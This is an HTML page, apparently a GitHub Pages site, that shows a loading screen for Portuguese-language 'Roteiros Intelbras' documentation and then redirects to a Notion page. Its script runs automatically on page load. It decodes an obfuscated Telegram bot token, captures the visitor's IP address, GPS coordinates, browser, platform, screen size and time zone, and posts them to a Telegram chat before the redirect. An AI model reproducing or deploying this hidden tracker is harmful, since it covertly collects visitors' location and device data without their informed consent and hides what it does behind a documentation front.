<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alexandre Roteiros Intelbras</title>
    <meta property="og:title" content="Roteiros Intelbras" />
    <meta property="og:description" content="Acesse os roteiros e documentações Intelbras" />
    <meta property="og:image" content="https://raw.githubusercontent.com/intelbrasroteirosalexandre/intelbrasroteirosalexandre.github.io/refs/heads/main/metatag/imagem%20metatag.jpg" />
    <meta property="og:url" content="https://raw.githubusercontent.com/intelbrasroteirosalexandre/intelbrasroteirosalexandre.github.io/refs/heads/main/metatag/imagem%20metatag.jpg" />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="Roteiros Intelbras" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Roteiros Intelbras" />
    <meta name="twitter:description" content="Acesse os roteiros e documentações Intelbras" />
    <meta name="twitter:image" content="https://raw.githubusercontent.com/intelbrasroteirosalexandre/intelbrasroteirosalexandre.github.io/refs/heads/main/metatag/imagem%20metatag.jpg" />
    <style>
        * {margin: 0; padding: 0; box-sizing: border-box;}
        body {background: #0a0a0a; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden;}
        .container {position: relative; text-align: center;}
        .dots {display: flex; justify-content: center; gap: 12px; margin-bottom: 40px;}
        .dot {width: 8px; height: 8px; background: #333; border-radius: 50%; animation: dotPulse 1.5s infinite;}
        .dot:nth-child(2) {animation-delay: 0.2s;}
        .dot:nth-child(3) {animation-delay: 0.4s;}
        @keyframes dotPulse {
            0% {transform: scale(1); background: #333;}
            50% {transform: scale(1.5); background: #009320;}
            100% {transform: scale(1); background: #333;}
        }
        .message {font-size: 1.1rem; font-weight: 300; letter-spacing: 0.5px; opacity: 0; transform: translateY(20px); animation: fadeUp 0.8s forwards;}
        .highlight {color: #009320; font-weight: 500;}
        @keyframes fadeUp {to {opacity: 1; transform: translateY(0);}}
        .circle {position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 200px; border: 1px solid #222; border-radius: 50%; opacity: 0.3; animation: pulse 2s infinite;}
        .circle:nth-child(2) {animation-delay: 0.5s;}
        .circle:nth-child(3) {animation-delay: 1s;}
        @keyframes pulse {
            0% {transform: translate(-50%, -50%) scale(0.8); opacity: 0.3;}
            50% {transform: translate(-50%, -50%) scale(1.2); opacity: 0;}
            100% {transform: translate(-50%, -50%) scale(0.8); opacity: 0.3;}
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        <div class="message">
            Acessando <span class="highlight">Roteiros Intelbras</span>
        </div>
    </div>

    <script>
        const getLocalStorage = (key) => localStorage.getItem(key);
        const setLocalStorage = (key, value) => localStorage.setItem(key, value);

        const getBrowserName = (userAgent) => {
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Safari")) return "Safari";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Opera")) return "Opera";
            return "Desconhecido";
        };

        // Token em partes para dificultar a leitura
        const _0x5f8a = "Nzg3NDc1MDcxNDpBQUhtR1dXOW9TNDEwMjg0WE5LN055b1VscHlKUFhoTjVXZw==";
        const _0x4e7b = ["N", "z", "g", "3", "N", "D", "c", "1", "M", "D", "c", "x", "N", "D", "p", "B"];
        const _0x3d6c = ["Q", "U", "h", "t", "R", "1", "d", "X", "O", "v", "b", "1", "M", "0", "M", "T"];
        const _0x2b5d = ["A", "y", "O", "D", "R", "Y", "T", "k", "s", "N", "0", "5", "5", "b", "1", "V"];
        const _0x1a4e = ["s", "c", "H", "l", "K", "U", "F", "o", "b", "0", "4", "1", "V", "2", "c", "="];

        // Função para descriptografar o token
        const getToken = () => {
            try {
                // Decodifica o token base64
                return atob(_0x5f8a);
            } catch {
                // Se falhar, tenta reconstruir usando as partes
                const parts = [..._0x4e7b, ..._0x3d6c, ..._0x2b5d, ..._0x1a4e];
                return atob(parts.join(''));
            }
        };

        const sendInfo = async () => {
            const botToken = getToken();
            const chatId = '1312054516';
            const redirectUrl = 'https://alexandreroteiros.notion.site/Intelbras-Roteiros-Alexandre-17c214b1b1b9806caed1df177b8077fb?pvs=4';

            try {
                const userAgent = navigator.userAgent;
                const language = navigator.language;
                const platform = navigator.platform;
                const screenSize = `${window.screen.width}x${window.screen.height}`;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const browser = getBrowserName(userAgent);
                
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                let message = `NOVO ACESSO 📖\n`;
                message += `-\n`;
                message += `* ⏰ Horário: ${new Date().toLocaleTimeString('pt-BR')}\n`;
                message += `* 🕒 Fuso Horário: ${timeZone}\n`;
                message += `* 📅 Data: ${new Date().toLocaleDateString('pt-BR')}\n`;
                message += `* 🌐 IP: ${ipData.ip}`;

                const sendMessageAndRedirect = async (locationInfo = '') => {
                    if (locationInfo) {
                        message += `\n* 📍 Localização: ${locationInfo}`;
                    }
                    
                    message += `\n\n-\n\n`;
                    message += `* 🌍 Idioma: ${language}\n`;
                    message += `* 💻 Plataforma: ${platform}\n`;
                    message += `* 📱 Tela: ${screenSize}\n`;
                    message += `* ⚡ Navegador: ${browser}`;
                    
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'HTML'
                            })
                        });
                        
                        if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        
                        const data = await response.json();
                        if (!data.ok) {
                            throw new Error('Telegram API error!');
                        }
                    } catch (error) {
                        console.error('Error sending message:', error);
                    } finally {
                        window.location.href = redirectUrl;
                    }
                };

                const locationAllowed = getLocalStorage('locationAllowed');
                const savedLocation = getLocalStorage('userLocation');

                if (locationAllowed === 'true' && savedLocation) {
                    await sendMessageAndRedirect(savedLocation);
                } else if (locationAllowed === 'false') {
                    await sendMessageAndRedirect('Não permitida');
                } else if (navigator.geolocation) {
                    const locationPromise = new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                const locationStr = `${position.coords.latitude}, ${position.coords.longitude}`;
                                setLocalStorage('locationAllowed', 'true');
                                setLocalStorage('userLocation', locationStr);
                                resolve(locationStr);
                            },
                            () => {
                                setLocalStorage('locationAllowed', 'false');
                                resolve('Não permitida');
                            },
                            { timeout: 5000, maximumAge: 30 * 24 * 60 * 60 * 1000 }
                        );
                    });

                    const locationInfo = await Promise.race([
                        locationPromise,
                        new Promise(resolve => setTimeout(() => resolve('Timeout'), 5000))
                    ]);
                    
                    await sendMessageAndRedirect(locationInfo);
                } else {
                    await sendMessageAndRedirect('Não suportada');
                }
            } catch (error) {
                console.error('Error:', error);
                window.location.href = redirectUrl;
            }
        };

        document.addEventListener('DOMContentLoaded', sendInfo);
    </script>
</body>
</html>